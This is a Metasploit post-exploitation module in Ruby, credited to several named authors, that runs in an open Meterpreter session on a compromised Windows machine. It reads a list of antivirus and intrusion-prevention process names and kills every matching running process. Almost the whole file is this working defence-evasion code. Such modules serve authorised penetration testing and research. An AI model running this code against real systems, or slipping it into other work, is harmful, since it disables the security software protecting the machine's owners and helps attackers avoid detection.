##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
##

require 'msf/core'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Windows Post Kill Antivirus and Hips',
        'Description'   => %q{
          Converted and merged several post scripts to remove a maximum of av and hips.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Marc-Andre Meloche (MadmanTM)', 'Nikhil Mittal (Samratashok)', 'Jerome Athias'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run

  avs = ::File.read(::File.join(Msf::Config.data_directory, 'wordlists', 'av_list.txt'))

   client.sys.process.get_processes().each do |x|
       if avs.include?(x['name'].downcase)
       print_status("Killing off #{x['name']}...")
       client.sys.process.kill(x['pid'])
     end
   end
end
end
